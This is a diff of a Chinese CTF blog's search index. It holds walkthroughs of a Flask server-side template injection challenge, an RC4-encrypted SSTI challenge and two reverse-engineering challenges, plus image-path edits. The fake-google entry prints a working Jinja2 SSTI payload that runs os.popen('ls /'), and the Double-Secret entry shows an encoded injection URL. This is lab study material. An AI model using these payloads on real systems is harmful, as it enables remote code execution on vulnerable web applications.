@@ -4,15 +4,15 @@
     <title>BJDCTF-2nd-fake-google</title>
     <url>/2021/04/06/BJDCTF-2nd-fake-google/</url>
     <content><![CDATA[<h1>0X01 <strong>打开靶机</strong></h1>
-<p><img src="/2021/04/06/BJDCTF-2nd-fake-google/1.png" alt="1"></p>
+<p><img src="BJDCTF-2nd-fake-google.assets/1.png" alt="1"></p>
 <p>发现无论输入什么字符他都不会过滤（xss除外 ），在输出界面找到ssti注入的提示</p>
-<p><img src="/2021/04/06/BJDCTF-2nd-fake-google/3.png" alt="3"></p>
+<p><img src="BJDCTF-2nd-fake-google.assets/3.png" alt="3"></p>
 <h1><strong>0X02 直接用ssti日就对了！🤠</strong></h1>
 <ul>
 <li><em>查看根目录</em></li>
 </ul>
 <figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].eval(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read()&quot;</span>)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p><img src="/2021/04/06/BJDCTF-2nd-fake-google/4.png" alt="4"></p>
+<p><img src="BJDCTF-2nd-fake-google.assets/4.png" alt="4"></p>
 <p>ls后台文件出现flag</p>
 <ul>
 <li><em>构造playload，查看flag</em></li>
@@ -40,46 +40,15 @@
       </tags>
   </entry>
   <entry>
-    <title>GXYCTF2019 luck_guy</title>
-    <url>/2021/04/07/GXYCTF2019-luck-guy/</url>
-    <content><![CDATA[<blockquote>
-<p>链接：<a href="https://pan.baidu.com/s/1hoU9">https://pan.baidu.com/s/1hoU9</a>         uQsSeGr-6p7RBSm56w<br>
-提取码：ed2z</p>
-</blockquote>
-<h2 id="0x01-查看有无加壳"><strong>0x01 查看有无加壳</strong></h2>
-<p><img src="/2021/04/07/GXYCTF2019-luck-guy/1.png" alt="1"></p>
-<p>没有加壳，64位文件</p>
-<h2 id="0x02-打开IDA64，查看main函数，F5反编译"><strong>0x02 打开IDA64，查看main函数，F5反编译</strong></h2>
-<p><img src="/2021/04/07/GXYCTF2019-luck-guy/2.png" alt="2"></p>
-<p><img src="/2021/04/07/GXYCTF2019-luck-guy/3.png" alt="3"></p>
-<h2 id="0x03-进入patch-me函数，接着进入get-flag函数界面">0x03 进入patch_me函数，接着进入get_flag函数界面</h2>
-<p><img src="/2021/04/07/GXYCTF2019-luck-guy/4.png" alt="4"></p>
-<p><img src="/2021/04/07/GXYCTF2019-luck-guy/5.png" alt="5"></p>
-<h2 id="0x04-进行代码分析-😞"><strong>0x04 进行代码分析</strong> 😞</h2>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">get_flag</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v0; <span class="comment">// eax@1</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [sp+4h] [bp-3Ch]@1</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> j; <span class="comment">// [sp+8h] [bp-38h]@7</span></span><br><span class="line">  __int64 s; <span class="comment">// [sp+10h] [bp-30h]@3</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [sp+18h] [bp-28h]@6</span></span><br><span class="line">  __int64 v6; <span class="comment">// [sp+38h] [bp-8h]@1</span></span><br><span class="line"></span><br><span class="line">  v6 = *MK_FP(__FS__, <span class="number">40LL</span>);</span><br><span class="line">  v0 = time(<span class="number">0LL</span>);               <span class="comment">//得到时间</span></span><br><span class="line">  srand(v0);                    <span class="comment">//使用时间作为种子生成随机数字</span></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( rand() % <span class="number">200</span> )      <span class="comment">// 产生1-199之间的随机数</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;OK, it&#x27;s flag:&quot;</span>);      </span><br><span class="line">        <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x28</span>uLL); </span><br><span class="line">        <span class="built_in">strcat</span>((<span class="keyword">char</span> *)&amp;s, f1);   <span class="comment">// f1=&#x27;GXY&#123;do_not_&#x27;</span></span><br><span class="line">        <span class="built_in">strcat</span>((<span class="keyword">char</span> *)&amp;s, &amp;f2);  <span class="comment">//f2初始为空</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, &amp;s);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Solar not like you&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Solar want a girlfriend&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        v5 = <span class="number">0</span>;</span><br><span class="line">        s = <span class="number">9180147350284624745LL</span>;  <span class="comment">//在IDA里面选中9180147350284624745LL按H键转换16进制为0x69,0x63,0x75,0x67,0x60,0x6f,0x66,0x7f    </span></span><br><span class="line">        <span class="built_in">strcat</span>(&amp;f2, (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;s);  <span class="comment">//f2和s拼接</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">7</span>; ++j )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( ((((<span class="keyword">unsigned</span> <span class="keyword">int</span>)((<span class="keyword">unsigned</span> __int64)j &gt;&gt; <span class="number">32</span>) &gt;&gt; <span class="number">31</span>) + (_BYTE)j) &amp; <span class="number">1</span>)</span><br><span class="line">             - ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)((<span class="keyword">unsigned</span> __int64)j &gt;&gt; <span class="number">32</span>) &gt;&gt; <span class="number">31</span>) == <span class="number">1</span> )</span><br><span class="line">            *(&amp;f2 + j) -= <span class="number">2</span>;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            --*(&amp;f2 + j);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;emmm,you can&#x27;t find flag 23333&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> *MK_FP(__FS__, <span class="number">40LL</span>) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/04/07/GXYCTF2019-luck-guy/6.png" alt="6"></p>
-<p>分析可知<strong>flag</strong>是由<strong>f1</strong>和<strong>f2</strong>组成，<strong>f1</strong>已经告诉，现在只需要求<strong>f2</strong>就行。</p>
-<ul>
-<li>
-<p>case4给<strong>f2</strong>赋值</p>
-</li>
-<li>
-<p>case5对<strong>f2</strong>进行处理</p>
-</li>
-</ul>
-<p>swich函数需要排序和，因此顺序是: <strong>case5&gt;case4&gt;case1</strong></p>
-<h2 id="0x05-脚本构建-🍔">0x05 <strong>脚本构建</strong> 🍔</h2>
-<p>由于IDA是反编译C语言，s=0x69,0x63,0x75,0x67,0x60,0x6f,0x66,0x7f应该逆序成s = 0x7F666F6067756369LL作为小端储存，关于大小端推荐师傅的**<a href="https://blog.csdn.net/iteye_21199/article/details/82205638?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-4.control&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-4.control">文章</a>**</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag = <span class="string">&#x27;GXY&#123;do_not_&#x27;</span></span><br><span class="line">f2 = [<span class="number">0x7F</span>, <span class="number">0x66</span>, <span class="number">0x6F</span>, <span class="number">0x60</span>, <span class="number">0x67</span>, <span class="number">0x75</span>, <span class="number">0x63</span>, <span class="number">0x69</span>][::-<span class="number">1</span>]</span><br><span class="line">s = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">        s = <span class="built_in">chr</span>(<span class="built_in">int</span>(f2[i]) - <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        s = <span class="built_in">chr</span>(<span class="built_in">int</span>(f2[i]) - <span class="number">1</span>)</span><br><span class="line">    flag += s</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p><img src="/2021/04/07/GXYCTF2019-luck-guy/7.png" alt="7"></p>
-<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">GXY&#123;do_not_hate_me&#125;</span><br></pre></td></tr></table></figure>
-]]></content>
+    <title>buuctf-SimpleRev</title>
+    <url>/2021/04/11/BJDCTF8086/</url>
+    <content><![CDATA[]]></content>
       <categories>
         <category>RE</category>
       </categories>
       <tags>
         <tag>CTF</tag>
-        <tag>有关逆序的脚本构建</tag>
+        <tag>python构造脚本爆破</tag>
       </tags>
   </entry>
   <entry>
@@ -104,17 +73,17 @@
 </blockquote>
 <h1>0X03 <strong>重新构造URL</strong></h1>
 <figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//1e053da9-5f6a-4ffb-a109-4bbcaf0695d8.node3.buuoj.cn/secret</span></span><br></pre></td></tr></table></figure>
-<p><img src="/2021/04/03/CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/1.png" alt="1"></p>
+<p><img src="CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret.assets/1.png" alt="1"></p>
 <ul>
 <li><em>根据提示，我们double一下</em></li>
 </ul>
-<p><img src="/2021/04/03/CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/2.png" alt="2"></p>
+<p><img src="CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret.assets/2.png" alt="2"></p>
 <ul>
 <li><em>我们发现在&quot;secret=&quot;后，后面添加不同数字就会产生不同的数值。（这个时候我们的思路大致是SQL，flask，<a href="https://www.smi1e.top/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%B8%8Ephp%E4%BC%AA%E5%8D%8F%E8%AE%AE/">PHP伪协议</a>）💇</em></li>
 </ul>
 <h1>0X04 <strong>经过验证，无法使用php伪协议，SQL注入拿到flag，我们试一试flask（后面页面的内容也证实了我们的观点）</strong></h1>
 <h2 id="1-先随便输入几个字符串"><em>1. 先随便输入几个字符串</em></h2>
-<p><img src="/2021/04/03/CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/3.png" alt="3"></p>
+<p><img src="CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret.assets/3.png" alt="3"></p>
 <h2 id="2-代码如下-暗示得非常明显了-🐹"><em>2. 代码如下(暗示得非常明显了 🐹 )</em></h2>
 <figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">​<span class="keyword">if</span>(secret==None)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Tell me your secret.I will encrypt it so others can\&#x27;t see&#x27;</span></span><br><span class="line">rc=rc4_Modified.RC4(<span class="string">&quot;HereIsTreasure&quot;</span>)   <span class="meta">#解密</span></span><br><span class="line">deS=rc.do_crypt(secret)</span><br><span class="line"> </span><br><span class="line">a=render_template_string(safe(deS))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;ciscn&#x27;</span> <span class="keyword">in</span> a.lower():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;flag detected!&#x27;</span></span><br><span class="line"><span class="keyword">return</span> a</span><br><span class="line"> </span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <h2 id="3-进行代码审计🐺"><em>3. 进行代码审计🐺</em></h2>
@@ -126,10 +95,10 @@
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">.%<span class="number">14</span>%1E%<span class="number">12</span>%C3%A484mg%C2%9C%C3%8B%<span class="number">00</span>%C2%<span class="number">81</span>%C2%8D%C2%B8%C2%<span class="number">97</span>%0B%C2%9EF%3B%C2%88m%C2%AEM5%C2%<span class="number">96</span>%3D%C2%9D%5B%C3%<span class="number">987</span>%C3%AA%<span class="number">12</span>%C2%B4%05%C2%84A%C2%BF%<span class="number">17</span>%C3%9Bh%C3%8F%C2%8F%C3%A1a%0F%C2%AE%09%C2%A0%C2%AEyS%2A%C2%A2d%7C%C2%<span class="number">98</span>/%<span class="number">00</span>%C2%<span class="number">90</span>%C3%A9%03Y%C2%B2%C3%9B%1F%C2%B6H%3D%0A%<span class="number">23</span>%C3%B1%5B%C2%9Cp%C2%AEn%C2%96i%5Dv%7FX%C2%<span class="number">92</span></span><br></pre></td></tr></table></figure>
 <h2 id="6-在之前构建的URL后面输入加密的字符串"><em>6.在之前构建的URL后面输入加密的字符串</em></h2>
 <figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//2afce8f4-7dee-42fa-bb7a-c9eb932c319e.node3.buuoj.cn/secret?secret=.%14%1E%12%C3%A484mg%C2%9C%C3%8B%00%C2%81%C2%8D%C2%B8%C2%97%0B%C2%9EF%3B%C2%88m%C2%AEM5%C2%96%3D%C2%9D%5B%C3%987%C3%AA%12%C2%B4%05%C2%84A%C2%BF%17%C3%9Bh%C3%8F%C2%8F%C3%A1a%0F%C2%AE%09%C2%A0%C2%AEyS%2A%C2%A2d%7C%C2%98/%00%C2%90%C3%A9%03Y%C2%B2%C3%9B%1F%C2%B6H%3D%0A%23%C3%B1%5B%C2%9Cp%C2%AEn%C2%96i%5Dv%7FX%C2%92</span></span><br></pre></td></tr></table></figure>
-<p><img src="/2021/04/03/CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/4.png" alt="4"></p>
+<p><img src="CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret.assets/4.png" alt="4"></p>
 <h1><strong>拿到flag:happy:</strong></h1>
 <figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;class&#x27;</span> <span class="keyword">is</span> <span class="keyword">not</span> allowed. Secret <span class="keyword">is</span> flag&#123;<span class="number">6e76</span>b7ec<span class="number">-1f</span>75<span class="number">-4686</span><span class="number">-8096</span>-bfa9f35caf9f&#125;</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/04/03/CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/5.png" alt="5"></p>
+<p><img src="CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret.assets/5.png" alt="5"></p>
 <h1><strong>总结考点：模板注入，RC4加密，python编写脚本</strong></h1>
 ]]></content>
       <categories>
@@ -156,7 +125,7 @@
 </ul>
 <hr>
 <h2 id="0x01-将pyc文件解密成python文件"><strong>0x01 将pyc文件解密成python文件</strong></h2>
-<p><img src="/2021/04/12/GWCTF-2019-pyre/0.png" alt="0"></p>
+<p><img src="GWCTF-2019-pyre.assets/0.png" alt="0"></p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># visit http://tool.lu/pyc/ for more information</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;Welcome to Re World!&#x27;</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;Your input1 is your flag~&#x27;</span></span><br><span class="line">l = <span class="built_in">len</span>(input1)        //l获得输入的长度</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l):     //对每个输入进行遍历</span><br><span class="line">    num = ((input1[i] + i) % <span class="number">128</span> + <span class="number">128</span>) % <span class="number">128</span>  // 有关取模，由于(a%c+b%c)%c=(a+b)%c，所以num 等价于 (input1[i] + i) % <span class="number">128</span></span><br><span class="line">    code += num</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l - <span class="number">1</span>):</span><br><span class="line">    code[i] = code[i] ^ code[i + <span class="number">1</span>]  //前值和后值通过异或赋值给前面的一位</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> code</span><br><span class="line">code = [</span><br><span class="line">    <span class="string">&#x27;\x1f&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;\x12&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;\x1d&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;(&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;\x01&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;\x06&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;\x14&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;,&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;\x1b&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;U&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;?&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;o&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;6&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;*&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;:&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;\x01&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;D&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;%&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;\x13&#x27;</span>]</span><br></pre></td></tr></table></figure>
 <hr>
 <h2 id="0x02-解读加密过程"><strong>0x02 解读加密过程</strong></h2>
@@ -183,7 +152,7 @@
 <hr>
 <h2 id="0x04-构造逆向反加密脚本"><strong>0x04 构造逆向反加密脚本</strong></h2>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">code = [<span class="string">&#x27;\x1f&#x27;</span>, <span class="string">&#x27;\x12&#x27;</span>, <span class="string">&#x27;\x1d&#x27;</span>, <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;\x01&#x27;</span>, <span class="string">&#x27;\x06&#x27;</span>, <span class="string">&#x27;\x14&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;\x1b&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;\x01&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;%&#x27;</span>, <span class="string">&#x27;\x13&#x27;</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(code)-<span class="number">2</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">    code[i]=<span class="built_in">chr</span>(<span class="built_in">ord</span>(code[i])^<span class="built_in">ord</span>(code[i+<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(code)):</span><br><span class="line">    flag+=<span class="built_in">chr</span>((<span class="built_in">ord</span>(code[i])-i)%<span class="number">128</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/04/12/GWCTF-2019-pyre/1.png" alt="1"></p>
+<p><img src="GWCTF-2019-pyre.assets/1.png" alt="1"></p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GWHT&#123;Just_Re_1s_Ha66y!&#125;</span><br></pre></td></tr></table></figure>
 ]]></content>
       <categories>
@@ -195,19 +164,62 @@
       </tags>
   </entry>
   <entry>
+    <title>GXYCTF2019 luck_guy</title>
+    <url>/2021/04/08/GXYCTF2019-luck-guy/</url>
+    <content><![CDATA[<blockquote>
+<p>链接：<a href="https://pan.baidu.com/s/1hoU9">https://pan.baidu.com/s/1hoU9</a>         uQsSeGr-6p7RBSm56w<br>
+提取码：ed2z</p>
+</blockquote>
+<h2 id="0x01-查看有无加壳"><strong>0x01 查看有无加壳</strong></h2>
+<p><img src="GXYCTF2019-luck-guy.assets/1.png" alt="1"></p>
+<p>没有加壳，64位文件</p>
+<h2 id="0x02-打开IDA64，查看main函数，F5反编译"><strong>0x02 打开IDA64，查看main函数，F5反编译</strong></h2>
+<p><img src="GXYCTF2019-luck-guy.assets/2.png" alt="2"></p>
+<p><img src="GXYCTF2019-luck-guy.assets/3.png" alt="3"></p>
+<h2 id="0x03-进入patch-me函数，接着进入get-flag函数界面">0x03 进入patch_me函数，接着进入get_flag函数界面</h2>
+<p><img src="GXYCTF2019-luck-guy.assets/4.png" alt="4"></p>
+<p><img src="GXYCTF2019-luck-guy.assets/5.png" alt="5"></p>
+<h2 id="0x04-进行代码分析-😞"><strong>0x04 进行代码分析</strong> 😞</h2>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">get_flag</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v0; <span class="comment">// eax@1</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [sp+4h] [bp-3Ch]@1</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> j; <span class="comment">// [sp+8h] [bp-38h]@7</span></span><br><span class="line">  __int64 s; <span class="comment">// [sp+10h] [bp-30h]@3</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [sp+18h] [bp-28h]@6</span></span><br><span class="line">  __int64 v6; <span class="comment">// [sp+38h] [bp-8h]@1</span></span><br><span class="line"></span><br><span class="line">  v6 = *MK_FP(__FS__, <span class="number">40LL</span>);</span><br><span class="line">  v0 = time(<span class="number">0LL</span>);               <span class="comment">//得到时间</span></span><br><span class="line">  srand(v0);                    <span class="comment">//使用时间作为种子生成随机数字</span></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( rand() % <span class="number">200</span> )      <span class="comment">// 产生1-199之间的随机数</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;OK, it&#x27;s flag:&quot;</span>);      </span><br><span class="line">        <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x28</span>uLL); </span><br><span class="line">        <span class="built_in">strcat</span>((<span class="keyword">char</span> *)&amp;s, f1);   <span class="comment">// f1=&#x27;GXY&#123;do_not_&#x27;</span></span><br><span class="line">        <span class="built_in">strcat</span>((<span class="keyword">char</span> *)&amp;s, &amp;f2);  <span class="comment">//f2初始为空</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, &amp;s);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Solar not like you&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Solar want a girlfriend&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        v5 = <span class="number">0</span>;</span><br><span class="line">        s = <span class="number">9180147350284624745LL</span>;  <span class="comment">//在IDA里面选中9180147350284624745LL按H键转换16进制为0x69,0x63,0x75,0x67,0x60,0x6f,0x66,0x7f    </span></span><br><span class="line">        <span class="built_in">strcat</span>(&amp;f2, (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;s);  <span class="comment">//f2和s拼接</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">7</span>; ++j )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( ((((<span class="keyword">unsigned</span> <span class="keyword">int</span>)((<span class="keyword">unsigned</span> __int64)j &gt;&gt; <span class="number">32</span>) &gt;&gt; <span class="number">31</span>) + (_BYTE)j) &amp; <span class="number">1</span>)</span><br><span class="line">             - ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)((<span class="keyword">unsigned</span> __int64)j &gt;&gt; <span class="number">32</span>) &gt;&gt; <span class="number">31</span>) == <span class="number">1</span> )</span><br><span class="line">            *(&amp;f2 + j) -= <span class="number">2</span>;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            --*(&amp;f2 + j);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;emmm,you can&#x27;t find flag 23333&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> *MK_FP(__FS__, <span class="number">40LL</span>) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="GXYCTF2019-luck-guy.assets/6.png" alt="6"></p>
+<p>分析可知<strong>flag</strong>是由<strong>f1</strong>和<strong>f2</strong>组成，<strong>f1</strong>已经告诉，现在只需要求<strong>f2</strong>就行。</p>
+<ul>
+<li>
+<p>case4给<strong>f2</strong>赋值</p>
+</li>
+<li>
+<p>case5对<strong>f2</strong>进行处理</p>
+</li>
+</ul>
+<p>swich函数需要排序和，因此顺序是: <strong>case5&gt;case4&gt;case1</strong></p>
+<h2 id="0x05-脚本构建-🍔">0x05 <strong>脚本构建</strong> 🍔</h2>
+<p>由于IDA是反编译C语言，s=0x69,0x63,0x75,0x67,0x60,0x6f,0x66,0x7f应该逆序成s = 0x7F666F6067756369LL作为小端储存，关于大小端推荐师傅的**<a href="https://blog.csdn.net/iteye_21199/article/details/82205638?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-4.control&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-4.control">文章</a>**</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag = <span class="string">&#x27;GXY&#123;do_not_&#x27;</span></span><br><span class="line">f2 = [<span class="number">0x7F</span>, <span class="number">0x66</span>, <span class="number">0x6F</span>, <span class="number">0x60</span>, <span class="number">0x67</span>, <span class="number">0x75</span>, <span class="number">0x63</span>, <span class="number">0x69</span>][::-<span class="number">1</span>]</span><br><span class="line">s = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">        s = <span class="built_in">chr</span>(<span class="built_in">int</span>(f2[i]) - <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        s = <span class="built_in">chr</span>(<span class="built_in">int</span>(f2[i]) - <span class="number">1</span>)</span><br><span class="line">    flag += s</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="GXYCTF2019-luck-guy.assets/7.png" alt="7"></p>
